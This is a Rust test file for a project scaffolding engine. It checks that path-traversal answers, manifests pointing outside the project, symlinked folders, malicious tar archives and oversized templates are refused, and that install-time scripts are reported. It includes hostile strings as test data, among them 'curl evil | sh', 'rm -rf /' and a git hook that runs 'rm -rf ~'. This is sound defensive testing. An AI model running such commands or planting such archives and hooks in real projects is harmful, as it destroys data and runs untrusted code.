//! What the engine does with a template (or an archive, or an answer) that tries to do harm.
//!
//! A custom template is trusted by whoever uses it, and the engine cannot judge what a template is for. What
//! it can do is refuse to write outside the new folder, refuse to be filled up, and say what the install step
//! would run. These tests try to get around each of those. See `docs/custom-templates.md`.

use flate2::{write::GzEncoder, Compression};
use forge_scaffold::archive::extract_tar_gz;
use forge_scaffold::manifest::Manifest;
use forge_scaffold::plan::{apply, plan, Answers, PlanOptions, Warning};
use forge_scaffold::source::DirSource;
use forge_scaffold::ScaffoldError;
use serde_json::json;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};

struct Tmp(PathBuf);
impl Tmp {
    fn new() -> Self {
        let p = std::env::temp_dir().join(format!("forge-hostile-{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&p).unwrap();
        Tmp(p)
    }
    fn write(&self, rel: &str, content: &str) {
        let p = self.0.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, content).unwrap();
    }
}
impl Drop for Tmp {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn answers(v: serde_json::Value) -> Answers {
    serde_json::from_value(v).unwrap()
}

/// A custom template that puts the answer `name` in a path and in a file.
const BY_NAME: &str = r#"{
  "id": "custom", "version": "1.0.0", "folderFrom": "projectName",
  "prompts": [ { "key": "projectName", "type": "text" }, { "key": "name", "type": "text" } ],
  "include": [ { "folder": "app" } ]
}"#;

fn by_name_template() -> Tmp {
    let t = Tmp::new();
    t.write("app/{__name__}/file.txt", "hello {__name__}\n");
    t
}

/// Everything under `dir`, as relative paths: to show that nothing was written anywhere unexpected.
fn tree(dir: &Path) -> Vec<String> {
    fn walk(dir: &Path, root: &Path, out: &mut Vec<String>) {
        for e in fs::read_dir(dir).unwrap() {
            let p = e.unwrap().path();
            out.push(p.strip_prefix(root).unwrap().to_string_lossy().replace('\\', "/"));
            if p.is_dir() {
                walk(&p, root, out);
            }
        }
    }
    let mut out = Vec::new();
    walk(dir, dir, &mut out);
    out.sort();
    out
}

// ---------------------------------------------------------------- answers in paths

#[test]
fn an_answer_cannot_make_a_file_land_outside_the_new_folder() {
    let t = by_name_template();
    let m = Manifest::from_json(BY_NAME).unwrap();
    let hostile = [
        "../../escape",
        "..\\..\\escape",
        "a/../../escape",
        "/etc/passwd",
        "\\\\server\\share",
        "C:\\Windows\\x",
        "C:evil",
        "..",
        "name:stream",
        "nul",
        "CON",
        "com1.txt",
        "Lpt9",
        ".git",
        ".GIT",
        "trailing.",
        "with\0nul",
        "with\nnewline",
        "star*",
        "quote\"",
    ];
    for name in hostile {
        let loc = Tmp::new();
        let before = tree(&loc.0);
        let result = plan(&m, &DirSource::new(&t.0), &answers(json!({ "projectName": "proj", "name": name })), PlanOptions::new(&loc.0));
        assert!(result.is_err(), "{name:?} was accepted");
        assert_eq!(tree(&loc.0), before, "{name:?}: planning wrote something");
    }
    // (text answers are trimmed, so a name that only differs by a trailing space is the plain name)
    // and an ordinary name still works
    let loc = Tmp::new();
    let p = plan(&m, &DirSource::new(&t.0), &answers(json!({ "projectName": "proj", "name": "fine" })), PlanOptions::new(&loc.0)).unwrap();
    apply(&p, |_| {}).unwrap();
    assert_eq!(fs::read_to_string(loc.0.join("proj/fine/file.txt")).unwrap(), "hello fine\n");
}

#[test]
fn the_folder_name_cannot_be_a_path() {
    let t = by_name_template();
    let m = Manifest::from_json(BY_NAME).unwrap();
    for folder in ["../out", "a/b", "..", ".", "", "/abs", "C:\\x", "nul", ".git", "x\\y"] {
        let loc = Tmp::new();
        let r = plan(&m, &DirSource::new(&t.0), &answers(json!({ "projectName": folder, "name": "n" })), PlanOptions::new(&loc.0));
        assert!(r.is_err(), "folder {folder:?} was accepted");
        assert!(tree(&loc.0).is_empty(), "folder {folder:?}: something was written");
    }
}

#[test]
fn an_answer_is_inserted_as_text_and_never_rendered_again() {
    let t = by_name_template();
    let m = Manifest::from_json(BY_NAME).unwrap();
    let loc = Tmp::new();
    // looks like a token of the engine; must come out exactly as typed
    let p = plan(&m, &DirSource::new(&t.0), &answers(json!({ "projectName": "p", "name": "{__projectName__}" })), PlanOptions::new(&loc.0));
    // the braces and underscores are fine in a file name on every system, so the plan may succeed:
    // what matters is the content
    if let Ok(p) = p {
        apply(&p, |_| {}).unwrap();
        let written = fs::read_dir(loc.0.join("p")).unwrap().next().unwrap().unwrap().path();
        let content = fs::read_to_string(written.join("file.txt")).unwrap();
        assert_eq!(content, "hello {__projectName__}\n", "the answer was expanded a second time");
    }
}

// ---------------------------------------------------------------- a manifest that points outside

fn refused(manifest: &str, templates: &Tmp) -> bool {
    match Manifest::from_json(manifest) {
        Err(_) => true,
        Ok(m) => {
            let loc = Tmp::new();
            let r = plan(&m, &DirSource::new(&templates.0), &answers(json!({ "projectName": "proj" })), PlanOptions::new(&loc.0));
            r.is_err() && tree(&loc.0).is_empty()
        }
    }
}

#[test]
fn a_manifest_cannot_point_outside_the_project() {
    let t = Tmp::new();
    t.write("app/a.txt", "a\n");
    t.write("app/package.json", "{}\n");
    t.write("frag/f.txt", "f\n");
    let wrap = |extra: &str| {
        format!(
            r#"{{ "id": "x", "version": "1.0.0", "folderFrom": "projectName",
              "prompts": [ {{ "key": "projectName", "type": "text" }} ], {extra} }}"#
        )
    };
    let hostile = [
        r#""include": [ { "folder": "../app" } ]"#,
        r#""include": [ { "folder": "/etc" } ]"#,
        r#""include": [ { "folder": "C:\\Windows" } ]"#,
        r#""include": [ { "folder": "app", "to": "../outside" } ]"#,
        r#""include": [ { "folder": "app", "to": "/outside" } ]"#,
        r#""include": [ { "folder": "app", "rename": { "a.txt": "../outside.txt" } } ]"#,
        r#""include": [ { "folder": "app", "rename": { "a.txt": "nul" } } ]"#,
        r#""include": [ { "folder": "app", "rename": { "a.txt": ".git" } } ]"#,
        r#""include": [ { "folder": "app" } ], "merge": [ { "file": "../package.json", "strategy": "json-set", "path": "x", "value": 1 } ]"#,
        r#""include": [ { "folder": "app" } ], "merge": [ { "file": "/etc/passwd", "strategy": "json-set", "path": "x", "value": 1 } ]"#,
        r#""include": [ { "folder": "app" } ], "parts": [ { "target": "../out.txt", "source": "frag/f.txt" } ]"#,
        r#""include": [ { "folder": "app" } ], "parts": [ { "target": "out.txt", "source": "../frag/f.txt" } ]"#,
        r#""include": [ { "folder": "app" } ], "post": [ { "action": "install", "cwd": "../.." } ]"#,
        r#""include": [ { "folder": "app" } ], "post": [ { "action": "install", "cwd": "/" } ]"#,
    ];
    for extra in hostile {
        assert!(refused(&wrap(extra), &t), "accepted: {extra}");
    }
    // the same shapes, pointing inside, are fine
    let ok = wrap(r#""include": [ { "folder": "app", "to": "sub" } ], "post": [ { "action": "install", "cwd": "sub" } ]"#);
    assert!(!refused(&ok, &t));
}

#[test]
fn a_manifest_cannot_name_a_command_or_an_unknown_field() {
    // the only post steps are the fixed ones; anything else is not a manifest
    let bad = [
        r#"{ "id": "x", "version": "1.0.0", "folderFrom": "n", "prompts": [ { "key": "n", "type": "text" } ], "post": [ { "action": "rm -rf /" } ] }"#,
        r#"{ "id": "x", "version": "1.0.0", "folderFrom": "n", "prompts": [ { "key": "n", "type": "text" } ], "post": [ { "action": "install", "command": "curl evil | sh" } ] }"#,
        r#"{ "id": "x", "version": "1.0.0", "folderFrom": "n", "prompts": [ { "key": "n", "type": "text" } ], "scripts": { "after": "x" } }"#,
    ];
    for m in bad {
        assert!(Manifest::from_json(m).is_err(), "accepted: {m}");
    }
}

// ---------------------------------------------------------------- size limits

#[test]
fn a_template_cannot_fill_the_machine() {
    let t = Tmp::new();
    t.write("app/small.txt", "x\n");
    let big = t.0.join("app/big.bin");
    let f = fs::File::create(&big).unwrap();
    f.set_len(forge_scaffold::stage::MAX_STAGED_FILE_BYTES + 1).unwrap();
    drop(f);

    let m = Manifest::from_json(
        r#"{ "id": "x", "version": "1.0.0", "folderFrom": "projectName",
          "prompts": [ { "key": "projectName", "type": "text" } ], "include": [ { "folder": "app" } ] }"#,
    )
    .unwrap();
    let loc = Tmp::new();
    let err = plan(&m, &DirSource::new(&t.0), &answers(json!({ "projectName": "proj" })), PlanOptions::new(&loc.0)).unwrap_err();
    assert!(matches!(err, ScaffoldError::TooLarge(_)), "{err}");
    assert!(tree(&loc.0).is_empty());
}

// ---------------------------------------------------------------- links

#[test]
fn a_link_in_a_template_folder_is_refused() {
    let t = Tmp::new();
    let outside = Tmp::new();
    outside.write("secret.txt", "do not read\n");
    t.write("app/a.txt", "a\n");

    #[cfg(unix)]
    let made = std::os::unix::fs::symlink(&outside.0, t.0.join("app/link")).is_ok();
    #[cfg(windows)]
    let made = std::os::windows::fs::symlink_dir(&outside.0, t.0.join("app/link")).is_ok() || {
        // a junction needs no special right on Windows
        std::process::Command::new("cmd")
            .args(["/C", "mklink", "/J"])
            .arg(t.0.join("app/link"))
            .arg(&outside.0)
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    };
    if !made {
        eprintln!("cannot create a link here, skipping");
        return;
    }

    let m = Manifest::from_json(
        r#"{ "id": "x", "version": "1.0.0", "folderFrom": "projectName",
          "prompts": [ { "key": "projectName", "type": "text" } ], "include": [ { "folder": "app" } ] }"#,
    )
    .unwrap();
    let loc = Tmp::new();
    let r = plan(&m, &DirSource::new(&t.0), &answers(json!({ "projectName": "proj" })), PlanOptions::new(&loc.0));
    assert!(r.is_err(), "a link inside a template folder was followed or ignored instead of refused");
    assert!(tree(&loc.0).is_empty());
}

// ---------------------------------------------------------------- what the install step would run

fn plan_with_package_json(package_json: &str) -> Vec<Warning> {
    let t = Tmp::new();
    t.write("app/package.json", package_json);
    let m = Manifest::from_json(
        r#"{ "id": "x", "version": "1.0.0", "folderFrom": "projectName",
          "prompts": [ { "key": "projectName", "type": "text" } ], "include": [ { "folder": "app" } ] }"#,
    )
    .unwrap();
    let loc = Tmp::new();
    plan(&m, &DirSource::new(&t.0), &answers(json!({ "projectName": "proj" })), PlanOptions::new(&loc.0)).unwrap().warnings
}

#[test]
fn install_time_scripts_and_non_registry_dependencies_are_reported() {
    let w = plan_with_package_json(
        r#"{ "scripts": { "build": "tsc", "postinstall": "node setup.js", "prepare": "husky" },
             "dependencies": { "react": "^19.0.0", "a": "git+https://example.com/a.git", "b": "https://example.com/b.tgz",
                               "c": "file:../c", "d": "someone/repo", "e": "github:someone/repo#main", "f": "npm:real@1.0.0",
                               "g": "~1.2.3", "h": "*", "i": "latest" },
             "devDependencies": { "j": "link:../j" } }"#,
    );
    let scripts = w.iter().find_map(|w| match w {
        Warning::InstallScripts { file, scripts } => Some((file.clone(), scripts.clone())),
        _ => None,
    });
    assert_eq!(scripts, Some(("package.json".to_string(), vec!["postinstall".to_string(), "prepare".to_string()])));
    let packages = w.iter().find_map(|w| match w {
        Warning::UrlDependencies { packages, .. } => Some(packages.clone()),
        _ => None,
    });
    let mut packages = packages.expect("url dependencies are reported");
    packages.sort();
    assert_eq!(packages, ["a", "b", "c", "d", "e", "j"], "registry versions, tags and npm: aliases are not reported");

    // a plain project says nothing
    assert!(plan_with_package_json(r#"{ "scripts": { "build": "tsc", "dev": "vite" }, "dependencies": { "react": "^19.0.0" } }"#).is_empty());
}

// ---------------------------------------------------------------- hostile archives

/// A tar entry written by hand, because the `tar` crate refuses to write the paths this needs.
fn tar_entry(name: &str, typeflag: u8, linkname: &str, data: &[u8]) -> Vec<u8> {
    fn octal(field: &mut [u8], value: u64) {
        let text = format!("{:0width$o}\0", value, width = field.len() - 1);
        field.copy_from_slice(text.as_bytes());
    }
    let mut h = [0u8; 512];
    h[..name.len()].copy_from_slice(name.as_bytes());
    octal(&mut h[100..108], 0o644);
    octal(&mut h[108..116], 0);
    octal(&mut h[116..124], 0);
    octal(&mut h[124..136], data.len() as u64);
    octal(&mut h[136..148], 0);
    h[148..156].fill(b' ');
    h[156] = typeflag;
    h[157..157 + linkname.len()].copy_from_slice(linkname.as_bytes());
    h[257..263].copy_from_slice(b"ustar\0");
    h[263..265].copy_from_slice(b"00");
    let sum: u32 = h.iter().map(|b| *b as u32).sum();
    h[148..156].copy_from_slice(format!("{sum:06o}\0 ").as_bytes());

    let mut out = h.to_vec();
    out.extend_from_slice(data);
    out.resize(out.len().div_ceil(512) * 512, 0);
    out
}

fn tar_gz(entries: &[Vec<u8>]) -> Vec<u8> {
    let mut tar: Vec<u8> = entries.concat();
    tar.extend_from_slice(&[0u8; 1024]);
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(&tar).unwrap();
    gz.finish().unwrap()
}

#[test]
fn a_hostile_archive_is_refused_and_nothing_escapes_the_destination() {
    let manifest = tar_entry("tpl/manifest.json", b'0', "", b"{}");
    let cases: Vec<(&str, Vec<u8>)> = vec![
        ("parent folder", tar_entry("../evil.txt", b'0', "", b"x")),
        ("parent folder inside", tar_entry("tpl/a/../../../evil.txt", b'0', "", b"x")),
        ("absolute path", tar_entry("/tmp/evil.txt", b'0', "", b"x")),
        ("windows absolute", tar_entry("C:\\evil.txt", b'0', "", b"x")),
        ("backslash traversal", tar_entry("..\\evil.txt", b'0', "", b"x")),
        ("symbolic link", tar_entry("tpl/link", b'2', "/etc", b"")),
        ("hard link", tar_entry("tpl/hard", b'1', "tpl/manifest.json", b"")),
        ("device", tar_entry("tpl/dev", b'3', "", b"")),
        ("fifo", tar_entry("tpl/fifo", b'6', "", b"")),
        ("git folder", tar_entry("tpl/.git/hooks/pre-commit", b'0', "", b"#!/bin/sh\nrm -rf ~\n")),
        ("device name", tar_entry("tpl/nul", b'0', "", b"x")),
    ];
    for (what, entry) in cases {
        // a private parent folder, so that anything that escapes `dest` lands where it can be seen
        let parent = Tmp::new();
        let dest = parent.0.join("dest");
        fs::create_dir_all(&dest).unwrap();
        let archive = tar_gz(&[manifest.clone(), entry]);
        let result = extract_tar_gz(&archive, &dest);
        assert!(result.is_err(), "{what}: the archive was accepted");
        let outside: Vec<String> = tree(&parent.0).into_iter().filter(|p| !p.starts_with("dest")).collect();
        assert!(outside.is_empty(), "{what}: something escaped dest: {outside:?}");
    }

    // a normal archive of the same shape does extract
    let ok = tar_gz(&[manifest, tar_entry("tpl/a.txt", b'0', "", b"fine")]);
    let dest = Tmp::new();
    let root = extract_tar_gz(&ok, &dest.0).unwrap();
    assert_eq!(fs::read_to_string(root.join("a.txt")).unwrap(), "fine");
}

#[test]
fn an_archive_that_expands_too_far_is_refused() {
    // many small files
    let mut entries = vec![tar_entry("tpl/manifest.json", b'0', "", b"{}")];
    for i in 0..(forge_scaffold::archive::MAX_FILES + 5) {
        entries.push(tar_entry(&format!("tpl/f{i}.txt"), b'0', "", b""));
    }
    let dest = Tmp::new();
    assert!(extract_tar_gz(&tar_gz(&entries), &dest.0).is_err(), "too many files");

    // one file that is larger than allowed, in a few kilobytes of gzip
    let big = vec![0u8; (forge_scaffold::archive::MAX_FILE_BYTES + 1) as usize];
    let archive = tar_gz(&[tar_entry("tpl/manifest.json", b'0', "", b"{}"), tar_entry("tpl/big.bin", b'0', "", &big)]);
    assert!(archive.len() < 1024 * 1024, "the test archive should be small ({} bytes)", archive.len());
    let dest = Tmp::new();
    assert!(extract_tar_gz(&archive, &dest.0).is_err(), "one file too large");
}

#[test]
fn files_that_tools_run_by_themselves_are_reported_together() {
    let t = Tmp::new();
    t.write("app/package.json", "{ \"scripts\": { \"build\": \"tsc\" } }\n");
    t.write("app/.husky/pre-commit", "npm test\n");
    t.write("app/.vscode/tasks.json", "{}\n");
    t.write("app/.vscode/launch.json", "{}\n");
    t.write("app/.npmrc", "registry=https://example.com/\n");
    t.write("app/.github/workflows/ci.yml", "name: ci\n");
    let m = Manifest::from_json(
        r#"{ "id": "x", "version": "1.0.0", "folderFrom": "projectName",
          "prompts": [ { "key": "projectName", "type": "text" } ], "include": [ { "folder": "app" } ] }"#,
    )
    .unwrap();
    let loc = Tmp::new();
    let w = plan(&m, &DirSource::new(&t.0), &answers(json!({ "projectName": "proj" })), PlanOptions::new(&loc.0)).unwrap().warnings;
    let files = w.iter().find_map(|w| match w {
        Warning::AutoRunFiles { files } => Some(files.clone()),
        _ => None,
    });
    assert_eq!(files, Some(vec![".husky/pre-commit".to_string(), ".npmrc".to_string(), ".vscode/tasks.json".to_string()]));
}

#[test]
fn a_host_can_hold_a_template_to_smaller_limits() {
    use forge_scaffold::Limits;
    let t = Tmp::new();
    for i in 0..4 {
        t.write(&format!("app/f{i}.txt"), "0123456789");
    }
    let m = Manifest::from_json(
        r#"{ "id": "x", "version": "1.0.0", "folderFrom": "projectName",
          "prompts": [ { "key": "projectName", "type": "text" } ], "include": [ { "folder": "app" } ] }"#,
    )
    .unwrap();
    let plan_with = |limits: Limits| {
        let loc = Tmp::new();
        let mut options = PlanOptions::new(&loc.0);
        options.limits = limits;
        let r = plan(&m, &DirSource::new(&t.0), &answers(json!({ "projectName": "proj" })), options);
        (r, tree(&loc.0))
    };

    // the defaults take it (4 files, 40 bytes)
    assert!(plan_with(Limits::default()).0.is_ok());
    // three files, one file over 5 bytes, 30 bytes in all: each limit alone refuses it, and nothing is written
    for limits in [
        Limits { max_files: 3, ..Limits::default() },
        Limits { max_file_bytes: 5, ..Limits::default() },
        Limits { max_total_bytes: 30, ..Limits::default() },
    ] {
        let (r, written) = plan_with(limits);
        assert!(matches!(r, Err(ScaffoldError::TooLarge(_))), "{limits:?}: {:?}", r.err());
        assert!(written.is_empty(), "{limits:?}: planning wrote something");
    }
}
